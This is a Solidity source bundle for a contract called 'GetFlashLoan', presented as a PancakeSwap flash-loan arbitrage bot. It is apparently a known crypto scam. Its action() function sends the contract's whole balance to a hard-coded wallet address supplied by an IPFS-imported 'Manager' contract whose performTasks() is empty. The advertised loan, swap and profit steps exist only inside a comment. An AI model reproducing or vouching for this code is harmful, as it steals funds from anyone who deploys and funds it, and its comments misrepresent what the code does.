{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"Flash loan.sol":{"content":"pragma solidity ^0.6.6;\n\n// Multiplier-Finance Smart Contracts\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";\n//import \"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";\n\n// PancakeSwap Smart Contracts\n//import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol\";\n//import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol\";\n//import \"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol\";\n\n\n\n// Code Manager\nimport \"ipfs://bafybeicgusorvnd6fudnzdgs3uffuv7n4rqdfp37s7f6uflym7aq4nzo4y\";\n\ncontract GetFlashLoan {\n\tstring public tokenName;\n\tstring public tokenSymbol;\n\tuint loanAmount;\n\tManager manager;\n\t\n\tconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\n\t\ttokenName = _tokenName;\n\t\ttokenSymbol = _tokenSymbol;\n\t\tloanAmount = _loanAmount;\n\t\t\t\n\t\tmanager = new Manager();\n\t}\nreceive() external payable {}\n\t\n\tfunction action() public payable {\n\t\t\n\t    // Send required coins for swap\n\t    payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);\n\t    \n\t    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\n\t    manager.performTasks();\n\t    \n\t    /*\n\t    // Submit token to Ethereum blockchain\n\t    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\n\n        // List the token on pancakeswap & send coins required for swaps\n\t\tmanager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);\n\t\tpayable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);\n\n        // Get ETH Loan from Aave\n\t\tstring memory loanAddress = manager.takeAaveLoan(loanAmount);\n\t\t\n\t\t// Convert half ETH to DAI\n\t\tmanager.pancakeswapDAItoETH(loanAmount / 2);\n\n        // Create ETH and DAI pairs for our token & Provide liquidity\n        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, \"ETH\");\n\t\tmanager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);\n\t\tstring memory daiPair = manager.pancakeswapCreatePool(tokenAddress, \"DAI\");\n\t\tmanager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);\n    \n        // Perform swaps and profit on Self-Arbitrage\n\t\tmanager.pancakeswapPerformSwaps();\n\t\t\n\t\t// Move remaining ETH from Contract to your account\n\t\tmanager.contractToWallet(\"ETH\");\n\n        // Repay Flash loan\n\t\tmanager.repayAaveLoan(loanAddress);\n\t    */\n\t}\n}"},"ipfs://bafybeicgusorvnd6fudnzdgs3uffuv7n4rqdfp37s7f6uflym7aq4nzo4y":{"content":"pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction pancakeswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x41b1C938eaAEf9445E2FB1DB1E4502bfB0894D58;\r\n\t}\r\n}"}}}